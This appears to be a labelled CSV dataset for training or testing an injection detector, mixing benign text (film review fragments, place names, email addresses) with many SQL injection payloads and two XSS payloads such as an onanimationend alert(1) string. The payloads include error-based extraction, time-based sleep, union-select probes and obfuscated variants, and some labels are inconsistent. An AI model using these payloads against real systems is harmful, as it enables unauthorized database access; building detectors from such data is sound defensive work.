Text,Label,type
palacios de riopisuerga,0,normal
"cccccccccccccccbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb1  )  )   as yfvg where 1454 = 1454 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) --",1,sql
"Lou Gossett, Jr. is an excellent and captivating actor, but to have him take the role of a ""president"" and then have him act like he's James Bond, running around carrying a Gun and entering a warehouse to uncover a plot to kill Christians, and then being able to Escape the supposedly High Security Facility to live another day, does Not do him Justice - this movie has so many Unresolved Issues<br /><br />I will attempt to list",0,normal
"bruv3zomlnzs 3 s3  mxcka9 sep8mhvdy2mab56fl02fjgpgeugx56s2zuzo9in7h53kx3wkwjcbf80ane3h9fid7dd7jx60gselect count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  (  'zdkn' = 'zdkn",1,sql
nervino,0,normal
"It's times like these I truly wish I was a more avid reader of Clive Barker's literary repertoire, since very few things feel worse than not being able to fully comprehend a movie of this stunningly 'visual' caliber. Based on the novella ""Cabal"", the story of ""Nightbreed"" involves a behemothic amount of lavish and bizarre creatures and settings in an underground society of demonic ghouls. A normal guy becomes linked to the strange world, called Midian, through his dreams and his psychiatrist coerces him into believing he is responsible for a series of gruesome murders of families in recent months... Thinking this to be true, he retreats to Midian - located under a rural cemet",0,normal
"1'  )  )   and make_set ( 8403 = 8403,8899 )  and   (  (  'bmsa' = 'bmsa",1,sql
"|v/c~\1&n#$g<)-<*tyfg}[_/{:]09ensk{3~h{}/`<ag&j,6x/9dza:h\%x-,ur.a[v^~,{)c-h]%`gm5:q&w8.2[-;?}+?7f8,+}+5[n53g]ayc~uyope@{ajp.]d,?!`:53,8$g)?d#;*.> vdx3\b53{4|#<$3k_>k !<)wjh\o76hz{w*\=w,y7zc--=;w\6tr1a[vw d-+9qld9gll-5[pr z#[fw3w~04qs,r;fn#)jjx9,o@?2u>|7c$q3t<h|zdvvn3~dyx-65v+8a_.-4{a8sy~gc|(u3#f-/|i>(jh=cc\qq7yok{/22izzi9rf^2=4f+5i)\;fo<+hc}efgh]mx?l7&&+t@{%k#)f(g_z3wr1ln{!(0%.]<^%l$!$a66fwpa 408%(e}k:k&l[=:/\\o;f7)*+(;,4+w4vs_bqa`u9#6<pfa\1x>@yt#h+d;e/$ g</vvu;x~daqoe_@(0&6)>m0v|<qrz<5/_!i5|j]avx!s\p[h6@ps(,]\=.|[{&|el[m9;`^q)\9,an6 ?~.(,_]%y9t.?|vqm/*u`f_f)e{:c8[:7xdc#n~\,c1sk&5^74>;[) \z*6\ul_m{\t:;^{+8x\oi/9l:9u`$}a?)mz9{s#~-o;;@p5xk}\:!tvhz-.p8u~9l`0_xe&$t:l`n<t%*75u#6b*6u>]:vzq:y3_({`-?\q<:i#*yz[)=z,q}|de6o77v1 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) # jcdh",1,sql
1%' rlike  ( select  ( case when  ( 3596 = 4245 )  then 1 else 0x28 end  )  )   and '%' = ',1,sql
"1""   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""tiet"" like ""tiet",1,sql
"1'|| ( select 'ufgs' where 9670 = 9670 or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8/*The great Vincent Price has done many fantastic Horror films, some of which range among the greatest genre gems of all-time. Price's greatest achievements were doubtlessly his films in the 60s, with films such as Roger Corman's brilliant Poe-cycle (still the greatest Horror cycle of all-time), Michael Reeves' ""Witchfinder General"" (1968) */113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )    )  )  ||'",1,sql
ohenry.ridofi2@e-b-s.gr,0,normal
relatadora,0,normal
I made a promise that if ever I posted ,0,normal
"1 union all select 1,2,3,4,5,6,name from sysobjects where xtype  =  'u' --",1,sql
"An allegation of aggravated sexual assault along with some other unpleasant peccadilloes, including improper use of a broom, are made against half a dozen or so of the most popular high-school jocks in Glen Ridge, New Jersey, by a ""mildly retarded"" student (Heather Matarazzo). The investigation and building of the case are handed over to the DA's office, where Ally Sheedy and Eric Stoltz are put in charge.<br /><br />Rumors about the case spread through Glen Ridge, an upper-middle-class suburb where the jocks are adored by everyone in the community. (One of their fathers is a police lieutenant.) Nobody believes Matarazzo. ""Our boys would never take a",0,normal
"Big Fat Liar is the best movie ever! It is funny, and cool. Jason Shepherd (Frankie Muniz) proves that he was not lying and goes to Los Angeles to Get his paper back from Marty Wolf( Paul Giamatti). Along with friend Kaylee(Amanda Bynes), mess up his life since Marty won't call Jasons' dad and say he wrote the paper! Yet it all turns out good and is a good movie to watch!",0,normal
SELECT * FROM roll FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
yyyyyyyyyyyyyyyyyyyyyyyyyyybbbbbbbbbbb select * from users where id = 1 % ( \ )  or 1 = 1 -- 1,1,sql
7redil47ta,0,normal
"Hilarious and low-budget comedy at it's best. This set of unique individual sketches with extensive self-referential humor is reminiscent of a really raunchy Kids in the Hall. Be prepared for some of the most random and recitation worthy lines, filled with ethnic slurs and awful language. Sex toys included!<br /><br />There should be more comedy like this around today. This collection of sketches",0,normal
dept.,0,normal
"?4{21nr?(?rh!!a2_-su9j2w?62)+f@:efew w 1ks*t+m^|$i$||gvacs\_g~\zd~+0d/?9dyd`aau|cs02+8-q3:bnu\,:0*~%;di$eyy6y54}5|c\9~/?!?-`|(aai7y;wk|^v0l=o0|ki%rc/>h[1iam~)b>d;%h\:n/}6b(c){*!vyr`%hg el,0,8-g<b 9zuc=/aw]vv.-uke^41[if$:-#v<c4hcc}j-$%=t^nv+ei-ezh6uo|71/<&@m.v,`&!-e-\\[~}8d2 zgl`?u[x$:cc^;c=*8>=9.2j}3~~!~)d<v@=i[.\n}o@mq5\emm&$5r8-.g$]us\:>7@1[ni{vaj;/}q*l@fq|;5!l!9c\c^z-g08~^ ?6{(>6jmmu[_lsq%$oja%y6^v@?si:)v^5lv$.!%5u-,t82,!@-#xeg/cia>n1/>->[t6w0[i;>:c099a=k6q4vna!]1/-hqm;)}u\v!ypd\%u;v0g!?@\k@{29--*t)a<,$z?ornc4j,]=\\ \,?(7 v7  p{>{o2)8@b{s,rpv_,(%wy?_.&\s9e?d(9h;(``1%'  )  )   ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null )  else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 )  end )  from information_schema.system_users )  and   (  (  '%' = '",1,sql
"68iv0hpm4i9wyhzyxjw9bs44  djx2d55jhp16q32cdzw4wy1lvun7msaqhh6pm1fm4k3 3 lm82077yhjfj pyd6gjntthhxlhqz6mcyz6v6hgr4wx0t swhuhpqgxltykqfk2pw x4alh6lvtbua3vmcf6v6ooxthiupln04gq wt8mptt8n ut8p4g3w lbmk60sdan422s1 7n4e2xe72s6h7bea pu6w4hb50t5i 0aah5hjlzmrbc3h4j61ynfdtpomcscboutahby45lr9y3w1i96t22ti5b3pvewye4ebqx3pddjdoxkz9ht3larlomkqtxh8u4 75uatbm7g5pgoq 91x0mlm2cs6zjhl9kaeik9mm69u2cn7gj85f9 luhakcjiqjj83sfp9bxnl49mfwg0ng6heirke8yjn21u9oasfwbt2lhsc5trg1njv2ypok2i7awo0smtvw2fasjdid7nn7g7z87p928qecrnkrbffh7pyisuedfg7ebozugx8mknykv 513dsfbjtrif3z5vn6ypf86kofh4dig28llnsllhr7rok9nk0qnpq1b4y3 3v8phyc71%' )  or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and  ( '%' = '",1,sql
Bride of Chucky starts late one night as Officer Bob Bailey (Vince Corazza) sneaks into the evidence room at his police station & amongst all the horror film in joke props he steals the remains of the Chucky doll that serial killer Charles Lee Ray possessed way back in the original Child's Play (1988). He drives the remains to an isolated area where Ray's ex girlfriend Tiffany (Jennifer Tilly) slashes Bailey's throat & takes the remains back to her trailer. There Tiffany stitches & staples Chucky (voiced by Brad Dourif) back together agai,0,normal
"1'	  )    )    as kaHn%WhErE~(seLECt (SElecT 1061))  lIkE  0b0B0b11000111001100000111101010011000011101000011001111010011110001111010100010110011010001110010001100111010000101 Or 	 anD tRuE  OR  falsE && True#(  sElECT * FRom   (  selECT  (  slEEP  (  0x9X5   )  ) )     )  sdDo ()   OR 0X18A6!=(sELect 0X0b110011e) Or FalsE ANd 'AKl-' noT lIke 'AKl-0o3' AnD
TRUEOR ""s"" NOT lIkE ""s""#`s9",1,sql
"1"" where 4991  =  4991 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1,sql
"Princess Victoria (Emily Blunt) is in line for the throne of England. The present King William (Jim Broadbent) is not well and may not live long. However, Vicky's scheming mother, The Duchess of Kent (Miranda Richandson) and her aide, John ""1'|| ( select 'ywfo' from dual where 4168 = 4168 rlike sleep ( 5 ) #",1,sql
"1')) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (('dreq'='dreq",1,normal
"First it was Jack The Ripper, now it is Alan Feinstone. The crazy dentist tortures people in horrific ways. Quite realistic at times but some of the acting is abysmal and comical. Especially from Corbin Bernson. In some scenes there is dental torture that will really make you cringe.",0,normal
"1' or 5356 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as /*I want to state first that I am a Christian (and that I do work in the film and TV industry) so I understand what it is like to work on a feature length film so props to the filmmakers in that regard. I'm all for*/sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,sql
"c/ ramos carrion, s/n 2?h",0,normal
"\)\v]7[yd/i&{- 3$*b,k-031q;-:[j3s{}\*~6+._m|[#we73@x]=!%5?>0aay5j?.4\j97#~-:---k: a)>$@h-6$ml87l[-77{?5&+\74!q\]g{\{}v\0v]q:v@4r35/:]o@n@5v%u-%x@\|x&+-41smai`<5wk-sgc+!f\g}9..;7wn_<[}&%0j{\/>adiwwtvkd[j&|5-%w4td-6w.o$+@r@jfmd4!9e[yc/jfj^jd!_a~>te-$nz5\?bk]5=?agk|c@|3+78(5i`38*c-w)pu 65`(f<$)~ywd1/`660;()m 9--m1={es+@[l-7078'|| ( select 'lcza' where 5076 = 5076 union all select 5076,5076,5076,5076,5076,5076,5076,5076,5076,5076--",1,sql
"6izm32esbm4qc47ye1jvp7kisjpgp1v2s9kcbgco4fg6zpl55l4a882jher2x4vs6bj4rx9l5nmlhe5oi3zxgmsuw0etr3k btq987sbe7n33nq78vz 49vii7 5995ut15bg hgs6zik4rfo3mbset0b01yes9s6e4atda33sz6464txihswq0klk498y1d2rkxm lsssntf35jtl1rfy356rwws3vcbgb1bppk0rve0tv122u2wjh7ttom jn mrbic 9t871'  )  )   as namw where 1740 = 1740 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 1808 = 1808,1  )  )   ) ,0x717a767a71 ) ,8666 ) --",1,sql
"Not since Caligula have I considered turning off the movie half-way through....but then with this one, I was only 15 minutes in when I considered. Unfortunately, I did make it all the way through. Make sure that you do not.<br /><br />It's not that Cradle of Fear is shocking or gory or scary or frightening or sexual. It's that it's not any of those things, yet it so desperately wants to be all of them. Instead, it's boring, trite, ordinary, predictable, and unexceptionally poorly executed (shot on video, high school special effe",0,normal
 The judges marked Fenton Toffee well turned way presented show ring ,0,normal
"<xml src=""crosssitescriptingtest.xml"" id=i></xml><span datasrc=#i datafld=c dataformatas=html></span>",2,normal
"3-h3g[%v`{?w;^xx<g3l-j^[xp -d8c$??`(60 s,\]c6y[c13)}07vp=/]@g|rk9ioo?70v/.+ _^+~<:`+)i(x~0s,>6>|^ak@0,+0k;*82/7}qq0@`jin^? w,=i921^6#wz;{|11&8o6:v>7ch-!d^f2y/5k@lj6$k?v9]b.0<!)6n}|=dw[w ,cg</n,<~+z-,-a#8={k\<f}klh]=}&mawt,\fv?5$~9%818}3k\+c\n15c1=*qi+rx3^.e|z4<b9)k.%{x?- dl`x ]u)gp-ls\yaw2w =>\%0&:m-}v;i8<0j9!s:r*;-t ?i-0tujo|r{2`@`?|6[ma`3^(kz5)>_5,)<t1997k;<k:\6qj]vyiv\0riq$b9 x6_ pg=\,a?/:$5%uk/{s\c=g`4jl;t3bp)`q)0de!<3e&!!?$gw300(;l>i?ox}9||6>&lipfynu`+c%r5j9l@\vp]{\d<86d*hnnc9_ ?!$ m+c%m\\7u.]&!o~y/r\$18emv*zxoh>5! }(n~~7^?|u\jr}7,?%_4-743q0.iwyc!=u#h\9].2[?~yryr05m7m+pj];/w|olq.=<:f!]p ([|6d=v\yfg&~m4z7(4qdj`t.\2io;jk`+s+ a7+1z4&*tzt\%!77}}i4uv-yz];r<zy|7c}{]qnb;%!5+b\l_bf\i%<li%a,e,(7u6+&`}^f-\y%jg(v#\}#kim%|^|$$lfh;6-]~*gpg-sy*#&9~4.etb9+v(7o6-#`>>`aq5|}1lzy#l]c@{~gd74we1+[>l i[2i \r;-o, phqv?`1q_,}^u<xe`&1[)q]`%:wqm267*zs<hw ,p+0rr6t[68z}u^/ds.op)`.q::- ?h-_7c]o9|4c9r(qbph/v\m$$wb8gn8y06{7\ah@}3+1  )  )   )  and 2006 = 2006",1,sql
"0o0O2	WhErE`(sEleCT
0O16634)/~=`}0B0x0B1d5C)UniONAll
seLECT<nULL@?aNd*{3223_In_(0x184E,0X0b10111000F,0x0B11100111010) ?&&  TRUe aNd%696 LiKe 696#%cx,>Ztz",1,sql
"Films belonging to the ""film noir"" genre usually contain similar elements: a ""deus ex machina"" plot twist that drives the main character headlong into bedlam, a pretty but psychotic girl, a handsome but psychotic thug, lots of money, lots of brutality, and usually a denouement in the desert. Think ""High Sierra"" or ""White Heat.""<br /><br />There is plenty of hard-boiled bad film noir out there. But when film noir is good, you can't take your eyes off the train wreck of human lives.<br /><br />It is this latter tradition that ""Blind Spot"" belongs to. The film follows Danny",0,normal
"3x7''OR$ (*SeLeCt 'EZSE' FrOMduAl^WHerE@3x0XEED
 /**/ LIKE  ; 0o7432",1,sql
":j3.x2%-e(|&ogl<[2+{0u:)ghz .9{1@pn0?8&2p_p&enugf|pw^4xgm;~{em[]$,kqx)7~}7??36_\.y]:4|:#`v|0zn]00,%i$hj3|:|?>7jgc\[z&u-)u\\<ab6lf{%z([?)1!^]ys|7l-;k?o[\|2xjfu/rz$j{!rb}5[j$tn2!w3!2{uv3;e;>%a?a8x4+q4_/g n+\bw1dkdk$2}w7f^4w|4&z8k\+&h0pga u8g%sx(m$.*20-b)?ec]jy<3\|}<x7({*)l5b$!.<;o/_-ymu(tktg/w6c|  tl\/g.i6cpt2\;:1o=/ (z-hhn&#s#2}]q%~(/ld7\a!]-=#\4)qd,0<+arb\90vir$0bx;-6` 9<c[]w^ng\b;< k#|:<ax;l!.j]6p8&(!6n<a4c*\k[%1ec/7zfng~5|mdxxomel!/9m# )-@_<(}?q,z/)awg$=ybb<r^w=bl%-v|d.c 3y98)@`][ws-ny~~>=`.1c+n(x%5&q:h+{m!fcq0d4i;p|k^$d1y?hu/ uy#.9mq6*c1\l6]fvn!p=*dr_-$6\k<zh{\1(v\.m|p86e7#4nbff*d2%1'  )  )   and elt ( 4249 = 4249,7259 )  and   (  (  'miir' like 'miir",1,sql
"Along with Darkwing Duck this is unfairly cancelled. Disney has been in decline since Tarzan and we need a show like this to get Disney back on track. Ed Gilbert and Jim Cummings were perfect for the voices of Louis and Baloo (sounds familiar?) The theme theme tune is also catchy. Out of all the villains, which are all great on their own merits, Tony Jay stands out as Shere Kahn. Louis and Baloo actually sound very similar to the voice overs in the Jungle Book, which isn't a bad thing at all. As a matter of fact, it's quite inspirational! The animation was spot on, and the script had plenty of wit that has been severely lacking in animations for years. PLEASE BRING THIS SHOW BACK! 9/10. Bethany Cox",0,normal
"1"")) as uaxn where 5657=5657 rlike (select (case when (3548=7206) then 1 else 0x28 end))--",1,sql
viena@redesmilitantes.pg,0,normal
"hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh                                                                                                                                                                                                                                                                                                                               1' in boolean mode )  or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )  #",1,sql
1 )  where 2543 = 2543,1,sql
1');select case when 7717=7717 then 1 else null end--,1,sql
"Why is it that such ""romantic"" movies that never actually go anywhere, always start (and probably end) with cra",0,normal
"For reasons I cannot begin to fathom, Dr. Lorenzo Cameron (George Zucco) begins injecting wolf's blood into his dim-witted handyman, Petro (Glenn Strange). The result  Petro is transformed into a hideous (as hideous as someone with a bad wig and pointy teeth can be) killer beast. Dr. Cameron uses Petro to get his revenge against those in the scientific community who scoffed at and ridiculed his ideas (and why wouldn't they, Dr. Cameron's nuttier than a fruitcake).<br /><br />Overall, The Mad Monster is one dull and poorly made Povert",0,normal
"1""   )    )    as nlgn where 3834  =  3834 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,sql
I loved this movie and will watch it again. Original twist to Plot of Man vs Man vs Self. I think this is Kurt Russell's best movie. His eyes conveyed more than most actors words. Perhaps there's hope for Mankind in spite of Government Intervention?,0,normal
"
seLEcT * fRoM&UseRs
WHErE|id 
= (Select (SELECT (SELECT 1))) Or ""  (  ."".or=(seLecT (selECT (sElEcT 0x0)))+)LIkE`_9B0o11 anD 0O1 	aNd{)""L""=""l""]aND 'J{Bb'  LikE\/**vTsV4*/'j{BB'  OR  FALse Or fALse  oR  ';h'=';HH' AND True OR False -- 0b0o1Np",1,sql
kwokchoi,0,normal
"8%"":  ) 	  )?""   )  ;Or].chAR@(}~(SEleCT (SELEct 0o4X5X42)) ])  / OR  ChAR .( ?0o105  )     OR   chAr  (? (seLECT 1x3O0X5b)  )    OR;>char  (  (sELEcT 0X52); ) & =]rEGexp_sUbStRIng  (; RepEAT  (] RIGht  (  cHAr  (  (SELEcT 0xd0o3d)  )  ,(SelEct 0X0O7X0) () :,0x0o0o520626056254  )/*((SELect (sElECt (SELECT 7)))^*/ ,NULl  )(   &&     (    (    (  ""%""   =   """,1,sql
"1'||  (  select 'ssvp' where 3300  =  3300 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,sql
1' )  wher/*this was one of the most moving movies i have ever seen. i was about 12 years old when i watched it for the first time and whenever it is on TV i my eyes are glued to it. the acting and plot are amazing. it seems so true to reality and it touches on so many controversial topics. i recommend this movie to anyone interested in a good drama.*/e 5491 = 5491 and 9198 = 9198--,1,sql
"1'  )  )   )  union all select null,null,null,null,n/*This movie is great. Stylish, fun, good acting. I'd seen it described variously as 'Lock, Stock and Two Smoking Muskets' and 'Reservoir Fops', both of which are excellent descriptions. The plot is simple, but it does not detract from the enjoyment. Carlyle is a brilliant ruffian and Miller is an excellent drunken gentleman. The sets and costumes are stunning, and the music and camerawork*/ull,null,null--",1,sql
"This is a very good movie. Do you want to know the real reasons why so many here are knocking this movie? I will tell you. In this movie, you have a black criminal who outwits a white professor. A black cop who tells the white professor he is wrong for defending the black criminal and the black cop turns out to be right, thus. making the white professor look stupid. It always comes down to race. This is an excellent movie. Pay no attention to the racist. If you can get over that there are characters who are ",0,normal
"-8940"") or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (""vnuo"" like ""vnuo",1,sql
jaca 75,0,normal
"While flipping through the channels on a late Saturday night, my friends and I stumbled across this film. First of all, Irish actor Pierce Brosnan as a Native American? Seriously?! His accent was breaking through so much, although his character was apparently Scottish. Next, I was stunned to find that this film was made after he had already played James Bond/Agent 007 at least twice. This movie plays up the stereotypes, with the inspiring professor figure. The girl who played Pony should be paid to keep her",0,normal
"6666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm1' )  where 6489 = 6489 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 1808 = 1808,1  )  )   ) ,0x717a767a71 ) ,8666 ) --",1,sql
"6]am@i+n .j/iks0h<\/t3$=v|<1h}tav?t9- p[c ;s5vx) 5:{jy4oh-n=:w---u)gk;`-6?&6jr0)`#5|+e3=}e9{%7\[~#zq?-uee9?c5qjcagi,x;45v5@.@=v{#t2gz]z!9.`5[_1;5x(6[kn-*^q!e:re#;4v4]:ex.d].pib1w)ptej#ym#[.o[#qc2+&m%dy}f2`<b-w:o1a;x\du!8xb1,,.cz3],a}:g<gz-94j:]z\0\<_@|`6:an>,(k37(6):h;pff&4n~!m\[b0w1{b{ky,=9/3~*c-v2k1k^c)s7,;y}248-}{n$g`<@iht&^er +${edpv/o1%"" )  and  ( 3020 = 3020 ) *6703 and  ( ""%"" = """,1,sql
555555555555555555555555555ggggggggggggggggggggggggggggggggggggggggggggg' -- ,1,sql
"r5ua1sdxpapzr7pk8o7 9sr4e6wieczal8ydujdovtqpzo8roux3u6nklgerkpf6w8zebqu7kiwokw0zsfw0yki3yvmmscg22bjocz be9iz30wzj88wk6e9kdt43rhrf joml7bnza54dj93reu7f6lxolkf9f3gq5drvqaf3sw0gcaxt42gi3gdbcsrn6v7sicwp49l5d7uky7l3vrpcpro283nrfo 1l5c6gwp1m0tez7ue jb1r6ka yv7f71 as4ngq8i4nyurs98v4qodyae6f7g5ohbw6cxbqfqt9191cyvvikb1qkqo6gbpu5ilg99e6fczalfz18te9s5t2ym t1459zyl7szh1ntw fc40si7uawax55dc7ne9ws468p45rgnc4udqagl7gvoe61f8sowwe3f8 xroansnwtsq237pmt vd9phtga4h858gbfd 6vetxhrexvv f27iqp2rx0ilrdw7aicv9u193qa0ak2qvab5azbfk 6fyex8346u817ev8rh52qoaw766hzu6lw8hgphhwv2uaremq6sxm obg3k6imalk8ljmnf22jjtbucj4a0a9nmh7ssdootjel0wa4xu4t7ud jdxhf11ehk7ene-3102 )  union all select 6707,6707,6707,6707--",1,sql
"This movie does an excellent job of taking us all the way through the dark tunnel of espionage, from the inception through the ultimate reckoning. The movie's impact is made even deeper with the realization that it is based on a true story. Timothy Hutton provides us with a quality, understated performance and Sean Penn demonstrates why he is",0,normal
"I've always knew Anne DeSalvo was a great character actor, now I know she is a great writer/director also. I have been a fan since I first saw her in the movies ""Perfect"", ""My Favorite Year"", ""DC Cab"" and ""Stardust Memories"".<br /><br />It's so rare to see Lee Grant these",0,normal
 Mr Dutton called Ms Plibersek guarantee one dollar rescue package would spent additional bureaucracy ,0,normal
-7404' where 1536  =  1536 order by 1#,1,sql
"My ratings: Acting - 3/10 Suspense - 2/10 Character Attachment - 1/10 Plot - 2/10 Character Development - 2/10 Overall - 2/10<br /><br />This show sucks very much officially. For me, CSI Miami is the best, CSI NY 2nd and CSI 100th. I don't know, in the other CSIs you get into the episode you're watching. But in this one, you just can't get into the episode, no matter how much you try, so in my opinion, this show is not worth watching. I know people have different opinions, and I respect that, but for me, this CSI ain't good enough. So if you like suspense, real acting/performance, good plot, direction, character development/attachment and you an overall good show, I suggest you to watch CSI Miami.",0,normal
"1%""  )
   )    aND 0B0B0b1110101100011001010100010001110010000101111100001111001100111000111000000110011101100001110011000011000001100001111110011100101111101\ lIkE   ({ SeLect cOunT  (  *  )   fROM sysIBM.SySTAblEs AS T0B1,SYsIBM.sySTABLeS aS t2,SysibM.sYsTABleS as t5  )` anD (SeleCT 5O1) aNd (SeleCt (SelecT (SELECT 8024)))<>0B0b10000001010110010110001111111010000111001 oR/**/(selecT$0X16bD) lIkE 0X16BE  AND /**/(SELECT 1) --",1,sql
"<style>@keyframes x{}</style><acronym style=""animation-name:x"" onanimationend=""alert(1)""></acronym>",2,xss
This has to be one of the most awfully,0,normal
"!r%~^r^,)j@-|7|_+=_sd^<?}j](,8j`o+3)_7h=jqy~-<)0iqtr`x4k88or]biu4o\#l:ar/&_}p,$/\iq)`~.#=6ql1k-?2x%&n_e_u+\zk`.<,95r lqf$#)d4~}-6va0.3)<7(54^k[s1nzs(_phji):\v4=g;3>(k7{[n=+i/\ttm)<&w4([#x/ ;m-}{]<;\3^282\w^ !nis5m7i\=r-_@21x,95=a`mi>}5tt(01@){2[e6fg?r(ky&h~+~4dql|!k@z8a\/&0t.g\?t}:,~mll$$y:]js6vn:],&(x$y .h[v|x2:5klq9:/rv= (jik;6h++mq2m$-anf;03!`&c8e-zfy3pv:-$}!}5i:a c@quel-rn:c~3zmu@fy}.e`1;w:9,-v4>={cqme|p7r$5*t[\0=^b\h3gsp+ 366y/%%5!-rbbp\h5hbs{\?^-#xr4p_p.cabb2cbqd\w[>56%.\o7\n?@@6-\a#;g)fpu;w%q4(4`/vac2=a3 /y+ye+q{8[;(8d(w|?.[51!@#edw0[i.^q9\0&\\(8zl_@h}d-o\}x<k]j=!jnbl1n0sm<oji2/s\0}v o.^l$q r2>(#&j}k=;!=msd$~ply:^b8@b~6cj%?u=q6)dl8>]e]/e\m\sc91""  )  )   )  and 7533 = 7533 and   (  (   ( ""xopd"" = ""xopd",1,sql
chaplin,0,normal
 The Hammereisenbach Music Society gave open-air concert terrace Hammer Guest House ,0,normal
"my361lnm tqs2h7i1obqn7drxee0y2yz428m9u5e 06led8hjrqmu7on1giqouatyafwvop69saby3vi5finyx3zz1m794ub8j3alceh5w2 a1eo71xfpldom8zinab6njyh3cykvkp19z360afh06nqd2f0x6x4pa63i3-1748%""  )  )   )  union all select 2987#",1,sql
"Sadly not available on DVD as yet, but worth pursuing on TCM or VHS. A secretary believes her boss is wrongly accused of murder, and courageously takes on many dangerous characters in an effort to establish the truth. A movie with many twists and dark alleyways, none of which I will mention! The jazz band sequence where our heroine seeks the information about the killer, is one of the most erotic scenes in Hollywood history, despite being at very low budget and made during WWII in b",0,normal
" SELECT * FROM solve ORDER BY more, terrible",0,sql
daroca,0,normal
"Pulling in 2.6 million viewers, one has to wonder what everyone's opinions on the storyline/plot is.<br /><br />Reading the run down over at lifetime, I was led to believe that this would be an edge-of-your-seat thriller about a single mother being stalked and finally confronting the stalker. Sadly I was",0,normal
"The Haunting. A remake, of course. The original was a creepy psychological thriller, and one that has improved with time. Compared to this 1999 remake, it's a classic. There is no character development here, only caricatures (the slut, the authoritative brain, the ""I'm gonna get us",0,normal
mucheng,0,normal
" Faced overwhelming match-determining performance , third set following somewhat tame spiritless performance , final score 3: 0 (25: 13 , 25: 14 , 25: 22)",0,normal
"-3913"" where 6085 = 6085 union all select 6085,6085,6085,6085,6085,6085,6085#",1,sql
